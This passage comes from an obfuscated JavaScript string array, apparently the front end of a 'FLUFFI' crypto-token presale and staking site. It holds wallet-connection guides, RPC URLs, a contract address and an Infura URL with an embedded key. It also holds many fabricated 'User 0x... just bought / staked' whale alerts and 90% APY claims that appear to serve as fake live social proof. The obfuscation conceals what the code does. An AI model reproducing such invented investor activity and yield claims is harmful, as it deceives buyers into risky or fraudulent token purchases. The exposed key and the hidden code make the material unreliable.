80;\x20color:\x20white;\x20border:\x20none;\x20border-radius:\x208px;\x20cursor:\x20pointer;\x20width:\x20100%;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20Cancel\x0a\x20\x20\x20\x20\x20\x20</button>\x0a\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20<div\x20style=\x22background:\x20#f1f5f9;\x20padding:\x2015px;\x20border-radius:\x208px;\x20margin-top:\x2015px;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<p\x20style=\x22font-size:\x2012px;\x20color:\x20#64748b;\x20margin:\x200;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20💡\x20<strong>Tip:</strong>\x20Make\x20sure\x20your\x20wallet\x20is\x20installed\x20and\x20you\x27re\x20on\x20a\x20supported\x20network\x20(BSC,\x20Ethereum,\x20Polygon,\x20etc.)\x0a\x20\x20\x20\x20\x20\x20\x20\x20</p>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22help-title\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22help-icon-wrapper\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<i\x20class=\x22fas\x20fa-qrcode\x20help-icon\x22></i>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span>WalletConnect\x20Guide</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22help-platform\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22platform-header\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22platform-icon\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<i\x20class=\x22fas\x20fa-desktop\x22></i>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Browser\x20Instructions</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<ol\x20class=\x22help-steps\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Select\x20WalletConnect\x20from\x20the\x20wallet\x20options</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Choose\x20your\x20preferred\x20wallet\x20from\x20the\x20list</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Follow\x20the\x20connection\x20instructions\x20for\x20your\x20wallet</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Approve\x20the\x20connection\x20request\x20in\x20your\x20wallet</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Your\x20wallet\x20will\x20be\x20connected\x20to\x20our\x20dApp</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</ol>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22help-platform\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22platform-header\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22platform-icon\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<i\x20class=\x22fas\x20fa-mobile-alt\x22></i>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Mobile\x20Instructions</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<ol\x20class=\x22help-steps\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Make\x20sure\x20you\x20have\x20a\x20compatible\x20wallet\x20installed</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Select\x20WalletConnect\x20from\x20the\x20wallet\x20options</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Choose\x20your\x20wallet\x20from\x20the\x20list\x20of\x20installed\x20wallets</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Approve\x20the\x20connection\x20request\x20in\x20your\x20wallet\x20app</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Your\x20wallet\x20will\x20connect\x20to\x20our\x20dApp</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</ol>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20','observe','event','price_','toString','bold','🔥\x20User\x200xws7...8t9\x20staked\x2092,100\x20FLUFFI\x20tokens','Please\x20install\x20Phantom\x20wallet\x20extension','3,876','⏳\x20Processing...','Connection','walletButton','Failed\x20to\x20connect\x20wallet:\x20','AddressZero','Contract\x20not\x20deployed\x20on\x20this\x20network\x20(Chain\x20ID:\x20','textContent','#1F2937','walletConnected','🐋\x20User\x200xa1b...2c3\x20just\x20bought\x2012.5\x20AVAX\x20worth\x20of\x20FLUFFI','💰\x20User\x200xrk2...3l4\x20staked\x20256,000\x20FLUFFI\x20earning\x2090%\x20APY','Error\x20adding\x20network:','\x20to\x20wallet','\x0a\x20\x20\x20\x20@keyframes\x20slide-in\x20{\x0a\x20\x20\x20\x20\x20\x20from\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20translateX(100%);\x0a\x20\x20\x20\x20\x20\x20\x20\x20opacity:\x200;\x0a\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20to\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20translateX(0);\x0a\x20\x20\x20\x20\x20\x20\x20\x20opacity:\x201;\x0a\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20@keyframes\x20slide-out\x20{\x0a\x20\x20\x20\x20\x20\x20from\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20translateX(0);\x0a\x20\x20\x20\x20\x20\x20\x20\x20opacity:\x201;\x0a\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20to\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20translateX(100%);\x0a\x20\x20\x20\x20\x20\x20\x20\x20opacity:\x200;\x0a\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20.animate-slide-in\x20{\x0a\x20\x20\x20\x20\x20\x20animation:\x20slide-in\x200.3s\x20ease-out;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20.animate-slide-out\x20{\x0a\x20\x20\x20\x20\x20\x20animation:\x20slide-out\x200.3s\x20ease-out;\x0a\x20\x20\x20\x20}\x0a\x20\x20','🚀\x20User\x200xd4e...5f6\x20joined\x20with\x203.2\x20AVAX\x20in\x20presale!','getCurrentTokenPrice','walletAddress','🚀\x20User0x229\x20joined\x20with\x202.8\x20ETH\x20in\x20presale!','tw-count','Successfully\x20claimed\x20','\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22text-center\x20py-8\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<h3\x20class=\x22text-2xl\x20font-bold\x20text-green-500\x22>✅\x20Staking\x20Now\x20Available!</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22text-gray-600\x20dark:text-gray-400\x20mt-2\x22>Reload\x20the\x20page\x20to\x20access\x20staking\x20features</p>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20','2025-08-27T00:00:00Z','Error\x20initializing\x20Solana\x20connection:','PublicKey','Current\x20FLUFFI\x20price:\x20$','🔥\x20User\x200xsl5...6m7\x20staked\x2089,700\x20FLUFFI\x20tokens','origin','charAt','EVM\x20wallet\x20reconnected\x20silently','00d\x2000h\x2000m\x2000s','publicKey','<i\x20class=\x22fas\x20fa-wallet\x20mr-2\x22></i>Connect\x20Wallet','constructor','#ffffff','forEach','disabled','🚀\x20WHALE!\x20User\x200xnuy8...9z0\x20joined\x20with\x201.95\x20ETH\x20in\x20presale!','🚀\x20User\x200xr8s...9t0\x20joined\x20FLUFFI\x20presale\x20with\x200.05\x20BNB','721EYbDjq','success','clipboard','withdrawUnsoldTokens','Please\x20ensure\x20you\x27re\x20on\x20the\x20correct\x20network','🚀\x20User0x94E\x20joined\x20with\x2010\x20ETH\x20in\x20presale!','active','https://sepolia.etherscan.io','nonpayable','Buy\x20error:','warning','getTimeUntilPresaleEnd','nativeCurrency','json','🔥\x20User\x200xl2m...3n4\x20bought\x203.7\x20BNB\x20worth\x20of\x20FLUFFI','</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22text-xs\x22>HOURS</p>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20','Presale\x20(40%)','🐾\x20User0x95B\x20bought\x2036,000\x20FLUFFI\x20tokens','🐋\x20User\x200xz7a...8b0\x20just\x20bought\x200.12\x20ETH\x20of\x20FLUFFI','onload','removeItem','TokensPurchased','🐋\x20WHALE\x20ALERT!\x20User\x200xkrs9...0t1\x20purchased\x2024.3\x20BNB\x20of\x20FLUFFI','%20%23FluffiArmy','#staking','https://api.avax.network/ext/bc/C/rpc','https://metamask.app.link','chainChanged','</span></p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22dark:text-gray-300\x22>💰\x20Earnings:\x20<span\x20class=\x22font-bold\x22>','connectionHelpModal','full','owner','purchases_','🔥\x20WHALE!\x20User\x200xlsu2...3v4\x20bought\x20620\x20AVAX\x20worth\x20of\x20FLUFFI','request','setItem','🐋\x20User\x200xo5p...6q7\x20just\x20invested\x2022.8\x20BNB\x20in\x20FLUFFI','Failed\x20to\x20record\x20purchase','walletConnect','🚀\x20WHALE!\x20User\x200xryc0...1d2\x20joined\x20with\x20480\x20AVAX\x20in\x20presale!','Connect\x20to\x20participate\x20in\x20FLUFFI\x20presale','</span>\x0a\x20\x20\x20\x20\x20\x20<button\x20class=\x22disconnect-btn\x22\x20onclick=\x22disconnectWallet()\x22>Disconnect</button>\x0a\x20\x20\x20\x20','</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20onclick=\x22this.closest(\x27.notification-toast\x27).remove()\x22\x20class=\x22ml-4\x20text-white\x20hover:text-gray-200\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<svg\x20class=\x22w-5\x20h-5\x22\x20fill=\x22none\x22\x20stroke=\x22currentColor\x22\x20viewBox=\x220\x200\x2024\x2024\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<path\x20stroke-linecap=\x22round\x22\x20stroke-linejoin=\x22round\x22\x20stroke-width=\x222\x22\x20d=\x22M6\x2018L18\x206M6\x206l12\x2012\x22></path>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</svg>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20','Binance\x20Smart\x20Chain\x20Mainnet','options','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22flex\x20justify-between\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22text-gray-600\x20dark:text-gray-300\x22>Price\x20per\x20Token:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22font-bold\x22>$','\x20FLUFFI!','CorrectLevel','0x38','4790600IZrKpC','Please\x20enter\x20a\x20valid\x20amount.','tokenPrice','ethereum','🔥\x20User0x17B\x20staked\x20300,000\x20FLUFFI\x20and\x20is\x20earning\x2090%\x20APY!','unstakeTokens','🔥\x20User\x200xof3...4g5\x20staked\x2045,000\x20FLUFFI\x20tokens\x20at\x2090%\x20APY!','#E2E8F0','presale-timer','contains','p-2\x20bg-gray-100\x20dark:bg-gray-700\x20rounded-md\x20animate-fade-in','remove','BSC','💰\x20User\x200xvq4...5r6\x20staked\x20567,800\x20FLUFFI\x20compounding\x20daily!','userPresale','0x89','🚀\x20User\x200xc3d...4e5\x20joined\x20with\x201.6\x20ETH\x20in\x20presale!','claims_','</div>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20','accountsChanged','USD','0xA86A','BSC\x20Mainnet','code','🚀\x20User0xCC7\x20joined\x20with\x201.25\x20ETH\x20in\x20presale!','claimReferralRewards','\x20BNB</span></p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22mt-4\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22text-sm\x20mb-2\x20font-semibold\x22>Share\x20your\x20link:</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22flex\x20space-x-3\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20onclick=\x22shareOnTwitter()\x22\x20class=\x22flex\x20items-center\x20justify-center\x20bg-blue-500\x20hover:bg-blue-600\x20text-white\x20px-4\x20py-2\x20rounded-lg\x20text-sm\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20🐦\x20Twitter\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20onclick=\x22shareOnTelegram()\x22\x20class=\x22flex\x20items-center\x20justify-center\x20bg-blue-600\x20hover:bg-blue-700\x20text-white\x20px-4\x20py-2\x20rounded-lg\x20text-sm\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20📱\x20Telegram\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20','Solana\x20connection\x20initialized','No\x20wallet\x20found','toUpperCase','\x27)\x22\x20style=\x22margin-top:\x2010px;\x20padding:\x205px\x2010px;\x20background:\x20#3b82f6;\x20color:\x20white;\x20border:\x20none;\x20border-radius:\x204px;\x20cursor:\x20pointer;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Copy\x20URI\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20','padStart','3683313fGIfVI','attributeName','🐾\x20User0x5A1\x20bought\x2065,000\x20FLUFFI\x20tokens','BinanceChain','solana','Network\x20switch\x20will\x20happen\x20on\x20purchase','message','\x0a\x20\x20','\x20per\x20token','toLocaleString','\x20FLUFFI','hidden','Staking\x20(20%)','Claim\x20failed:\x20','<span\x20class=\x22spinner\x22></span>\x20Connecting...','referralRewards','killSession','getPresaleStatus','🎯\x20User\x200xaa9...0b1\x20invited\x205\x20friends\x20and\x20earned\x2050%\x20bonus!','dark','presaleActive','#000000','add','Switching\x20to\x20','#059669','https://t.me/share/url?url=','https://amoy.polygonscan.com','connected','ref','259486BAKxZF','DOMContentLoaded','https://snowtrace.io','head','Please\x20install\x20Trust\x20Wallet\x20extension','0xfcc8e15857AeFee92FE761Bfe5a7300C7D44AdB5','Balance\x20update\x20error:','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22flex\x20justify-between\x20border-t\x20pt-2\x20mt-2\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22text-gray-600\x20dark:text-gray-300\x22>Total\x20Tokens:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22font-bold\x20text-green-600\x20dark:text-green-400\x22>','stage-time-left','trust','walletType','How\x20to\x20Use\x20WalletConnect','🎯\x20User\x200xgkl7...8m9\x20invited\x208\x20friends\x20for\x20massive\x20bonus!','documentElement','\x22\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22flex-1\x20p-3\x20border\x20rounded-l-lg\x20dark:bg-gray-700\x20dark:border-gray-600\x20text-black\x20dark:text-white\x22\x20readonly>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20onclick=\x22copyReferralLink()\x22\x20class=\x22bg-blue-500\x20hover:bg-blue-600\x20text-white\x20px-4\x20rounded-r-lg\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Copy\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22bg-gray-100\x20dark:bg-gray-700\x20p-4\x20rounded-lg\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22dark:text-gray-300\x22>👥\x20Total\x20referrals:\x20<span\x20class=\x22font-bold\x22>','🔥\x20User\x200xlc4...5d6\x20bought\x2018.9\x20BNB\x20worth\x20of\x20FLUFFI\x20tokens','#111827','minutes','💰\x20User\x200xtn8...9o0\x20staked\x201,500,000\x20FLUFFI\x20for\x20mega\x20rewards!','🚀\x20User\x200xf6g...7h8\x20joined\x20with\x200.25\x20BNB\x20in\x20presale!','2502DXvhuL','true','currentPrice','isActive','🐋\x20User\x200xx7y...8z0\x20just\x20bought\x2032.1\x20AVAX\x20of\x20FLUFFI','🔥\x20User0x3BC\x20staked\x2020,000\x20FLUFFI\x20for\x20early\x20rewards!','tokenBalances','networkIndicator','color','uint256','🐾\x20User0x7AA\x20bought\x20120,000\x20FLUFFI\x20tokens','rateLimitMessage',')\x20to\x20','utils','custom-styles','Unsupported\x20chain:\x20','🐾\x20User0x1F7\x20bought\x2055,000\x20FLUFFI\x20tokens','POST','view','#FFFFFF','Please\x20install\x20MetaMask\x20or\x20another\x20Web3\x20wallet','🎯\x20User0x822\x20invited\x204\x20friends\x20and\x20earned\x2040%\x20referral\x20bonus','🐾\x20User0x19D\x20bought\x2022,000\x20FLUFFI\x20tokens','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22help-title\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22help-icon-wrapper\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<i\x20class=\x22fas\x20fa-ghost\x20help-icon\x22></i>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span>Phantom\x20Wallet\x20Guide</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22help-platform\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22platform-header\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22platform-icon\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<i\x20class=\x22fas\x20fa-desktop\x22></i>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Browser\x20Instructions</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<ol\x20class=\x22help-steps\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Install\x20Phantom\x20extension\x20for\x20Chrome,\x20Brave,\x20or\x20Firefox</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Create\x20a\x20new\x20wallet\x20or\x20import\x20an\x20existing\x20one</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Click\x20\x22Connect\x20Wallet\x22\x20and\x20select\x20Phantom</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Approve\x20the\x20connection\x20request\x20in\x20the\x20Phantom\x20popup</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</ol>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22help-platform\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22platform-header\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22platform-icon\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<i\x20class=\x22fas\x20fa-mobile-alt\x22></i>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Mobile\x20Instructions</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<ol\x20class=\x22help-steps\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Install\x20Phantom\x20app\x20from\x20App\x20Store\x20or\x20Play\x20Store</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Open\x20our\x20website\x20in\x20Phantom\x27s\x20in-app\x20browser</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Tap\x20\x22Connect\x20Wallet\x22\x20and\x20select\x20Phantom</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Approve\x20the\x20connection\x20request\x20in\x20the\x20app</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>For\x20direct\x20connection,\x20open\x20our\x20site\x20via\x20Phantom\x20browser</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</ol>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20','Network\x20','presaleEndTime','rgba(255,\x20255,\x20255,\x200.9)','addEventListener','🐾\x20User0x8A0\x20bought\x20110,000\x20FLUFFI\x20tokens','🚀\x20User\x200xfs6...7u8\x20joined\x20with\x2015.3\x20BNB\x20in\x20presale!','🐾\x20User0x7B9\x20bought\x2090,000\x20FLUFFI\x20tokens','https://polygon-rpc.com/','wallet_addEthereumChain','reduce','https://mainnet.infura.io/v3/f09a42b35c814e08ad7e92837f8db27f','legend','lastChild','\x20directly','🔥\x20WHALE!\x20User\x200xpwa4...5b6\x20bought\x2047.3\x20AVAX\x20worth\x20of\x20FLUFFI','https://testnet.bscscan.com','https://fluffi.site/logo.png','Using\x20approximate\x20prices.\x20Real-time\x20fetch\x20failed.','🔥\x20User\x200xk1l...2m3\x20bought\x200.045\x20ETH\x20worth\x20of\x20FLUFFI','label','🎉\x20Purchase\x20successful!\x20You\x20bought\x20','bg-green-500','chainId','Solana\x20Devnet','script','plugins','card','location','Error\x20detecting\x20network:','AVAX','session_update','WalletConnect\x20URI\x20copied\x20to\x20clipboard!','calculateRewards','formatUnits','updateTokenPrice','#F59E0B','contract\x20IERC20','🚀\x20User\x200xq7r...8s9\x20joined\x20FLUFFI\x20presale\x20with\x200.008\x20ETH','bg-yellow-500','notification-styles','prepend','🎯\x20User0x33B\x20invited\x20a\x20friend\x20and\x20earned\x2010%\x20referral\x20bonus','🐾\x20User0xF4A\x20bought\x2070,000\x20FLUFFI\x20tokens','\x0a\x20\x20\x20\x20<p\x20class=\x22text-white\x20font-semibold\x20text-sm\x20mb-2\x22>UNLOCKS\x20IN</p>\x0a\x20\x20\x20\x20','lastRewardCalculationTime','Claim\x20failed','AVAXUSDT','🐋\x20User0xD31\x20just\x20bought\x201.8\x20BNB\x20worth\x20of\x20FLUFFI\x20🚀','BNB','test','price','#EF4444','pow','feePayer','Polygon\x20Mainnet','Solana\x20wallet\x20not\x20connected.','amount','chainCurrencySelect','🎯\x20User0xA13\x20invited\x202\x20friends\x20and\x20earned\x2020%\x20referral\x20bonus','🚀\x20Buy\x20Now','Tokens\x20to\x20receive:\x20','🎯\x20User\x200xcde5...6f7\x20got\x208%\x20bonus\x20for\x20referring\x202\x20whales!','\x27,\x20\x27_blank\x27)\x22\x20style=\x22padding:\x2010px;\x20background:\x20#f6851b;\x20color:\x20white;\x20border:\x20none;\x20border-radius:\x208px;\x20cursor:\x20pointer;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Open\x20in\x20MetaMask\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20onclick=\x22window.open(\x27https://link.trustwallet.com/wc?uri=','</span></span></span>','backgroundColor','https://phantom.app/ul/browse/','Solana\x20purchase\x20error:','button[onclick=\x22buyFluffi()\x22]','textarea','MATIC','https://www.bnbchain.org/en/binance-wallet','appendChild','🟢\x20Solana\x20-\x20','isTrust','🐋\x20User\x200xr1s...2t3\x20purchased\x2018.9\x20AVAX\x20of\x20FLUFFI','🎯\x20User0x551\x20invited\x201\x20friend\x20and\x20earned\x2010%\x20referral\x20bonus','class','getTime','warn','bottom','Error\x20disconnecting\x20WalletConnect:','WalletConnect\x20connection\x20established!','49996EjiCYh','darkModeIcon','https://polygonscan.com','search','2025-11-10T00:00:00Z','className','🔥\x20User0x4D7\x20staked\x20120,000\x20FLUFFI\x20for\x20huge\x20rewards!','Error\x20switching\x20network:\x20','Transaction\x20submitted!\x20Waiting\x20for\x20confirmation...','walletButtons','blockExplorerUrl','Switched\x20to\x20','referrals_','stakingStart','userStaked','Please\x20connect\x20your\x20wallet\x20first.','bool','presale-minutes','tokensSold','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22text-lg\x20font-semibold\x20text-gray-800\x20dark:text-white\x20mt-1\x22>FLUFFI\x20Tokens</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22space-y-2\x20text-left\x20mb-6\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22flex\x20justify-between\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22text-gray-600\x20dark:text-gray-300\x22>Amount\x20Paid:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22font-bold\x22>','https://testnet.snowtrace.io','💰\x20User\x200xxt0...1u2\x20staked\x20432,000\x20FLUFFI\x20farming\x20big\x20rewards!','🐋\